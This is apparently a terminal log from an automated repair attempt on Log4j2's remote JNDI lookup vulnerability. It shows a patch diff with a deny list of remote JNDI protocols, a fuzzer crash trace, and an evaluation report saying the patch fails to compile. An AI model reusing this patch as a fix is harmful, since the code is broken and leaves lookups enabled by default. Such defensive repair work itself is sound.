[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +        final String lowerName = [1;35mjndiName.toLowerCase[0m[1m([0m[1m)[0m;                           [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +        if [1m([0m[1;35mlowerName.contains[0m[1m([0m[32m"://"[0m[1m)[0m[1m)[0m [1m{[0m                                           [2m                [0m
[2;36m                    [0m         +            final int protoIndex = [1;35mlowerName.indexOf[0m[1m([0m[32m"://"[0m[1m)[0m;                       [2m                [0m
[2;36m                    [0m         +            final String protocol = [1;35mlowerName.substring[0m[1m([0m[1;36m0[0m, protoIndex[1m)[0m;            [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +            if [1m([0m![1;35mprotocol.equals[0m[1m([0m[32m"java"[0m[1m)[0m[1m)[0m [1m{[0m                                        [2m                [0m
[2;36m                    [0m         +                return false;                                                      [2m                [0m
[2;36m                    [0m         +            [1m}[0m                                                                      [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +        if [1m([0m[1;35mlowerName.startsWith[0m[1m([0m[32m"ldap:"[0m[1m)[0m || [1;35mlowerName.startsWith[0m[1m([0m[32m"ldaps:"[0m[1m)[0m ||     [2m                [0m
[2;36m                    [0m         +            [1;35mlowerName.startsWith[0m[1m([0m[32m"rmi:"[0m[1m)[0m || [1;35mlowerName.startsWith[0m[1m([0m[32m"dns:"[0m[1m)[0m ||        [2m                [0m
[2;36m                    [0m         +            [1;35mlowerName.startsWith[0m[1m([0m[32m"iiop:"[0m[1m)[0m || [1;35mlowerName.startsWith[0m[1m([0m[32m"corba:"[0m[1m)[0m[1m)[0m [1m{[0m     [2m                [0m
[2;36m                    [0m         +            return false;                                                          [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +        return true;                                                               [2m                [0m
[2;36m                    [0m              [1m}[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m              [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ---                                                                                 [2m                [0m
[2;36m                    [0m         a/core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter. [2m                [0m
[2;36m                    [0m         java                                                                                [2m                [0m
[2;36m                    [0m         +++                                                                                 [2m                [0m
[2;36m                    [0m         b/core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter. [2m                [0m
[2;36m                    [0m         java                                                                                [2m                [0m
[2;36m                    [0m         @@ [1;36m-21[0m,[1;36m6[0m +[1;36m21[0m,[1;36m7[0m @@                                                                   [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.core.config.plugins.Plugin;                        [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.message.Message;                                   [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.message.MultiformatMessage;                        [2m                [0m
[2;36m                    [0m         +import org.apache.logging.log4j.util.PropertiesUtil;                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m          [35m/[0m**                                                                                [2m                [0m
[2;36m                    [0m           * Returns the event's rendered message in a StringBuilder.                        [2m                [0m
[2;36m                    [0m         @@ [1;36m-29[0m,[1;36m8[0m +[1;36m30[0m,[1;36m10[0m @@                                                                  [2m                [0m
[2;36m                    [0m          @[1;35mConverterKeys[0m[1m([0m[1m{[0m[32m"m"[0m, [32m"msg"[0m, [32m"message"[0m [1m}[0m[1m)[0m                                           [2m                [0m
[2;36m                    [0m          public final class MessagePatternConverter extends LogEventPatternConverter [1m{[0m      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         +    private static final boolean FORMAT_MESSAGES_NO_LOOKUPS =                      [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1m([0m[1m)[0m[1;35m.getBooleanProperty[0m[1m([0m[32m"log4j2.formatMsgNoLookups"[0m,      [2m                [0m
[2;36m                    [0m         false[1m)[0m;                                                                             [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m              private final String[1m[[0m[1m][0m formats;                                                [2m                [0m
[2;36m                    [0m         -                                                                                   [2m                [0m
[2;36m                    [0m              private final Configuration config;                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m              [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m         @@ [1;36m-68[0m,[1;36m7[0m +[1;36m71[0m,[1;36m7[0m @@                                                                   [2m                [0m
[2;36m                    [0m                          result = [1;35mmsg.getFormattedMessage[0m[1m([0m[1m)[0m;                                [2m                [0m
[2;36m                    [0m                      [1m}[0m                                                                      [2m                [0m
[2;36m                    [0m                      if [1m([0mresult != null[1m)[0m [1m{[0m                                                  [2m                [0m
[2;36m                    [0m         -                [1;35mtoAppendTo.append[0m[1m([0mconfig != null && [1;35mresult.contains[0m[1m([0m[32m"$[0m[32m{[0m[32m"[0m[1m)[0m ?        [2m                [0m
[2;36m                    [0m         +                [1;35mtoAppendTo.append[0m[1m([0mconfig != null && !FORMAT_MESSAGES_NO_LOOKUPS && [2m                [0m
[2;36m                    [0m         [1;35mresult.contains[0m[1m([0m[32m"$[0m[32m{[0m[32m"[0m[1m)[0m ?                                                             [2m                [0m
[2;36m                    [0m                              [1;35mconfig.getSubst[0m[1m([0m[1m)[0m[1;35m.replace[0m[1m([0mevent, result[1m)[0m : result[1m)[0m;            [2m                [0m
[2;36m                    [0m                      [1m}[0m else [1m{[0m                                                               [2m                [0m
[2;36m                    [0m                          [1;35mtoAppendTo.append[0m[1m([0m[32m"null"[0m[1m)[0m;                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         --- a/core/src/main/java/org/apache/logging/log4j/core/helpers/Constants.java       [2m                [0m
[2;36m                    [0m         +++ b/core/src/main/java/org/apache/logging/log4j/core/helpers/Constants.java       [2m                [0m
[2;36m                    [0m         @@ [1;36m-41[0m,[1;36m6[0m +[1;36m41[0m,[1;36m16[0m @@                                                                  [2m                [0m
[2;36m                    [0m              public static final String JNDI_CONTEXT_NAME =                                 [2m                [0m
[2;36m                    [0m         [32m"java:comp/env/log4j/context-name"[0m;                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m              [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m         +     * System property to disable JNDI lookups for security.                       [2m                [0m
[2;36m                    [0m         +     *[35m/[0m                                                                            [2m                [0m
[2;36m                    [0m         +    public static final String LOG4J_ENABLE_JNDI_LOOKUP =                          [2m                [0m
[2;36m                    [0m         [32m"log4j2.enableJndiLookup"[0m;                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +    [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m         +     * System property to disable message pattern lookups for security.            [2m                [0m
[2;36m                    [0m         +     *[35m/[0m                                                                            [2m                [0m
[2;36m                    [0m         +    public static final String LOG4J_FORMAT_MSG_NO_LOOKUPS =                       [2m                [0m
[2;36m                    [0m         [32m"log4j2.formatMsgNoLookups"[0m;                                                        [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +    [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m               * Line separator.                                                             [2m                [0m
[2;36m                    [0m               *[35m/[0m                                                                            [2m                [0m
[2;36m                    [0m              public static final String LINE_SEP =                                          [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1m([0m[1m)[0m[1;35m.getStringProperty[0m[1m([0m[32m"line.separator"[0m, [32m"\n"[0m[1m)[0m;           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ===Patch [33mResult[0m===                                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ===[33mIssue[0m===                                                                         [2m                [0m
[2;36m                    [0m         == Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical:    [2m                [0m
[2;36m                    [0m         Remote JNDI Lookup                                                                  [2m                [0m
[2;36m                    [0m         JNDI lookups with attacker-controlled remote URLs can, depending on the JDK         [2m                [0m
[2;36m                    [0m         version, lead to remote code execution or the exfiltration of information.          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1m([0mNamingContex [2m                [0m
[2;36m                    [0m         tLookup.kt:[1;36m61[0m[1m)[0m                                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1m([0mJndiLookup.jav[1;92ma:60[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1m([0mInterpolator.jav[1;92ma:112[0m[1m)[0m     [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1m([0mStrSubstitutor. [2m                [0m
[2;36m                    [0m         jav[1;92ma:904[0m[1m)[0m                                                                           [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1m([0mStrSubstitutor.jav[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1m)[0m                                                                                   [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1m([0mMessagePattern [2m                [0m
[2;36m                    [0m         Converter.jav[1;92ma:72[0m[1m)[0m                                                                  [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1m([0mPatternFormatter.jav[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1m)[0m                                                                              [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1m)[0m                                                                               [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1m([0mAbstractStrin [2m                [0m
[2;36m                    [0m         gLayout.jav[1;92ma:45[0m[1m)[0m                                                                    [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1m([0mAbstract [2m                [0m
[2;36m                    [0m         OutputStreamAppender.jav[1;92ma:113[0m[1m)[0m                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1m([0mAppenderControl.j [2m                [0m
[2;36m                    [0m         av[1;92ma:102[0m[1m)[0m                                                                            [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1m([0mLoggerConfig.jav[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1m)[0m                                                                                 [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:407[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:368[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at [1;35morg.apache.logging.log4j.core.Logger.log[0m[1m([0mLogger.jav[1;92ma:110[0m[1m)[0m                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1m([0mAbstractLogger.jav[1;92ma:1916[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1m([0mSimpleLoggerFuzzer.jav[1;92ma:42[0m[1m)[0m       [2m                [0m
[2;36m                    [0m         DEDUP_TOKEN: 03a39a742f79fa3d                                                       [2m                [0m
[2;36m                    [0m         == libFuzzer crashing input ==                                                      [2m                [0m
[2;36m                    [0m         ===Evaluation [33mReport[0m===                                                             [2m                [0m
[2;36m                    [0m         # Evaluation Report                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ## Summary                                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         The initial issue reveals a critical security vulnerability in Apache Log4j2 where  [2m                [0m
[2;36m                    [0m         JNDI lookups with attacker-controlled remote URLs can lead to remote code execution [2m                [0m
[2;36m                    [0m         or information exfiltration. The vulnerability is triggered through the logging     [2m                [0m
[2;36m                    [0m         mechanism when a message containing a JNDI lookup expression is processed. A patch  [2m                [0m
[2;36m                    [0m         was attempted to address this by adding protocol validation for JNDI lookups and    [2m                [0m
[2;36m                    [0m         introducing configuration properties to disable JNDI and message pattern lookups.   [2m                [0m
[2;36m                    [0m         However, the patch failed to compile due to an attempt to reassign a final variable [2m                [0m
[2;36m                    [0m         `ENABLE_JNDI` in the `JndiLookup.java` file.                                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ## Description                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ### Initial Issue Analysis                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         The stack trace reveals the vulnerability path:                                     [2m                [0m
[2;36m                    [0m         [1;36m1[0m. A fuzzer test input triggers a warning log through                               [2m                [0m
[2;36m                    [0m         `SimpleLoggerFuzzer.fuzzerTestOneInput`                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m. The message is processed by `MessagePatternConverter.format`, which performs     [2m                [0m
[2;36m                    [0m         message substitution                                                                [2m                [0m
[2;36m                    [0m         [1;36m3[0m. The substitution process invokes `Interpolator.lookup`, which delegates to       [2m                [0m
[2;36m                    [0m         `JndiLookup.lookup`                                                                 [2m                [0m
[2;36m                    [0m         [1;36m4[0m. `JndiLookup.lookup` performs a JNDI lookup operation without proper validation   [2m                [0m
[2;36m                    [0m         [1;36m5[0m. This triggers a security exception indicating a remote JNDI lookup attempt with  [2m                [0m
[2;36m                    [0m         attacker-controlled URLs                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         The critical security issue is that the JNDI lookup functionality does not validate [2m                [0m
[2;36m                    [0m         or restrict the protocols and URLs that can be accessed, allowing potentially       [2m                [0m
[2;36m                    [0m         malicious remote lookups through protocols like `ldap:[35m/[0m[35m/[0m`, `rmi:[35m/[0m[35m/[0m`, `dns:[35m/[0m[35m/[0m`, etc. [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ### Patch Attempt Details                                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         The patch attempted to introduce three main security improvements across multiple   [2m                [0m
[2;36m                    [0m         files:                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         **File [1;36m1[0m:                                                                           [2m                [0m
[2;36m                    [0m         `core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`**         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         Changes made:                                                                       [2m                [0m
[2;36m                    [0m         - Added imports for `Logger`, `StatusLogger`, and `PropertiesUtil`                  [2m                [0m
[2;36m                    [0m         - Changed `ENABLE_JNDI` from a simple boolean to a final constant initialized in a  [2m                [0m
[2;36m                    [0m         static block                                                                        [2m                [0m
[2;36m                    [0m         - The static block reads configuration from `log4j2.enableJndiLookup` property      [2m                [0m
[2;36m                    [0m         [1m([0mdefaults to false[1m)[0m                                                                 [2m                [0m
[2;36m                    [0m         - Added warning logging when JNDI lookup is enabled                                 [2m                [0m
[2;36m                    [0m         - Introduced a new method `[1;35misAllowedJndiProtocol[0m[1m([0mString jndiName[1m)[0m` that:            [2m                [0m
[2;36m                    [0m           - Validates JNDI names for protocol prefixes                                      [2m                [0m
[2;36m                    [0m           - Only allows `java:` protocol for local JNDI contexts                            [2m                [0m
[2;36m                    [0m           - Rejects remote protocols: `ldap:[35m/[0m[35m/[0m`, `ldaps:[35m/[0m[35m/[0m`, `rmi:[35m/[0m[35m/[0m`, `dns:[35m/[0m[35m/[0m`, `iiop:[35m/[0m[35m/[0m`, [2m                [0m
[2;36m                    [0m         `corba:[35m/[0m[35m/[0m`                                                                          [2m                [0m
[2;36m                    [0m           - Also checks for protocol specifications without the `:[35m/[0m[35m/[0m` separator             [2m                [0m
[2;36m                    [0m         - Modified the `lookup` method to call `isAllowedJndiProtocol` before performing    [2m                [0m
[2;36m                    [0m         the actual JNDI lookup                                                              [2m                [0m
[2;36m                    [0m         - Returns null and logs a warning for rejected JNDI lookups                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         **File [1;36m2[0m:                                                                           [2m                [0m
[2;36m                    [0m         `core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.j [2m                [0m
[2;36m                    [0m         ava`**                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         Changes made:                                                                       [2m                [0m
[2;36m                    [0m         - Changed plugin name from [32m"MessagePatternConverter"[0m to [32m"m"[0m                         [2m                [0m
[2;36m                    [0m         - Added import for `PropertiesUtil`                                                 [2m                [0m
[2;36m                    [0m         - Introduced `FORMAT_MESSAGES_NO_LOOKUPS` constant that reads from                  [2m                [0m
[2;36m                    [0m         `log4j2.formatMsgNoLookups` property [1m([0mdefaults to false[1m)[0m                            [2m                [0m
[2;36m                    [0m         - Modified the message formatting logic to skip substitution when                   [2m                [0m
[2;36m                    [0m         `FORMAT_MESSAGES_NO_LOOKUPS` is true                                                [2m                [0m
[2;36m                    [0m         - Updated the condition from `config != null && [1;35mresult.contains[0m[1m([0m[32m"$[0m[32m{[0m[32m"[0m[1m)[0m` to `config   [2m                [0m
[2;36m                    [0m         != null && !FORMAT_MESSAGES_NO_LOOKUPS && [1;35mresult.contains[0m[1m([0m[32m"$[0m[32m{[0m[32m"[0m[1m)[0m`                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         **File [1;36m3[0m:                                                                           [2m                [0m
[2;36m                    [0m         `core/src/main/java/org/apache/logging/log4j/core/helpers/Constants.java`**         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         Changes made:                                                                       [2m                [0m
[2;36m                    [0m         - Added two new constant declarations:                                              [2m                [0m
[2;36m                    [0m           - `LOG4J_ENABLE_JNDI_LOOKUP = [32m"log4j2.enableJndiLookup"[0m`                          [2m                [0m
[2;36m                    [0m           - `LOG4J_FORMAT_MSG_NO_LOOKUPS = [32m"log4j2.formatMsgNoLookups"[0m`                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ### Compilation Error                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         The patch failed with the following compilation error:                              [2m                [0m
[2;36m                    [0m         ```                                                                                 [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m                                                                             [2m                [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/lookup/[0m[95mJndiLoo[0m [2m                [0m
[2;36m                    [0m         [95mkup.java[0m:[1m[[0m[1;36m134[0m,[1;36m9[0m[1m][0m cannot assign a value to final variable ENABLE_JNDI                [2m                [0m
[2;36m                    [0m         ```                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         This error occurs because the patch declares `ENABLE_JNDI` as a final variable in   [2m                [0m
[2;36m                    [0m         the static block but there appears to be another location in the code [1m([0mline [1;36m134[0m[1m)[0m    [2m                [0m
[2;36m                    [0m         where an assignment to this variable is attempted. The original code had            [2m                [0m
[2;36m                    [0m         `ENABLE_JNDI` as a non-final variable set to `true`, and the patch converted it to  [2m                [0m
[2;36m                    [0m         a final variable initialized in a static block. However, the patch appears to have  [2m                [0m
[2;36m                    [0m         left some existing assignment code intact that attempts to modify this now-final    [2m                [0m
[2;36m                    [0m         variable.                                                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ### Areas for Further Investigation                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         To develop a complete understanding of the vulnerability and proper fix, the        [2m                [0m
[2;36m                    [0m         following areas should be investigated:                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m. **JndiLookup.java complete implementation**: Review the entire file to identify  [2m                [0m
[2;36m                    [0m         where line [1;36m134[0m is located and what code is attempting to reassign `ENABLE_JNDI`.    [2m                [0m
[2;36m                    [0m         The patch only shows the beginning of the file but the error occurs at line [1;36m134[0m.    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m. **Message substitution flow**: Examine the complete flow from                    [2m                [0m
[2;36m                    [0m         `MessagePatternConverter` through `StrSubstitutor` to understand all paths where    [2m                [0m
[2;36m                    [0m         message interpolation occurs and where lookups can be triggered.                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m. **Interpolator.java**: Investigate how the `Interpolator` class manages multiple [2m                [0m
[2;36m                    [0m         lookup implementations and whether additional safeguards are needed at that level.  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m. **Configuration loading**: Understand how `PropertiesUtil` loads properties and  [2m                [0m
[2;36m                    [0m         whether the default values are appropriate for security.                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m5[0m. **Existing JNDI usage**: Search the codebase for all locations where JNDI        [2m                [0m
[2;36m                    [0m         lookups are performed to ensure comprehensive coverage of the vulnerability.        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m6[0m. **Test coverage**: Identify existing tests that may depend on JNDI lookup        [2m                [0m
[2;36m                    [0m         functionality and would need to be updated to work with the new security            [2m                [0m
[2;36m                    [0m         restrictions.                                                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m7[0m. **Backward compatibility**: Assess the impact of changing the default behavior   [2m                [0m
[2;36m                    [0m         from JNDI enabled to disabled, and the plugin name change in                        [2m                [0m
[2;36m                    [0m         MessagePatternConverter.                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ## Initial Issue Log                                                                [2m                [0m
[2;36m                    [0m         Here is the initial issue log of the codebase:                                      [2m                [0m
[2;36m                    [0m         [1m<[0m[1;95missue[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: [0m   [2m                [0m
[2;36m                    [0m         [39mRemote JNDI Lookup[0m                                                                  [2m                [0m
[2;36m                    [0m         [39mJNDI lookups with attacker-controlled remote URLs can, depending on the JDK[0m         [2m                [0m
[2;36m                    [0m         [39mversion, lead to remote code execution or the exfiltration of information.[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1;39m([0m[39mNamingContex[0m [2m                [0m
[2;36m                    [0m         [39mtLookup.kt:[0m[1;36m61[0m[1;39m)[0m                                                                      [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1;39m([0m[39mJndiLookup.jav[0m[1;92ma:60[0m[1;39m)[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1;39m([0m[39mInterpolator.jav[0m[1;92ma:112[0m[1;39m)[0m     [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1;39m([0m[39mStrSubstitutor.[0m [2m                [0m
[2;36m                    [0m         [39mjav[0m[1;92ma:904[0m[1;39m)[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1;39m)[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1;39m([0m[39mMessagePattern[0m [2m                [0m
[2;36m                    [0m         [39mConverter.jav[0m[1;92ma:72[0m[1;39m)[0m                                                                  [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1;39m([0m[39mPatternFormatter.jav[0m[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1;39m([0m[39mPatternLayout.jav[0m [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1;39m)[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1;39m([0m[39mPatternLayout.jav[0m [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1;39m)[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1;39m([0m[39mAbstractStrin[0m [2m                [0m
[2;36m                    [0m         [39mgLayout.jav[0m[1;92ma:45[0m[1;39m)[0m                                                                    [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1;39m([0m[39mAbstract[0m [2m                [0m
[2;36m                    [0m         [39mOutputStreamAppender.jav[0m[1;92ma:113[0m[1;39m)[0m                                                      [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1;39m([0m[39mAppenderControl.j[0m [2m                [0m
[2;36m                    [0m         [39mav[0m[1;92ma:102[0m[1;39m)[0m                                                                            [2m                [0m
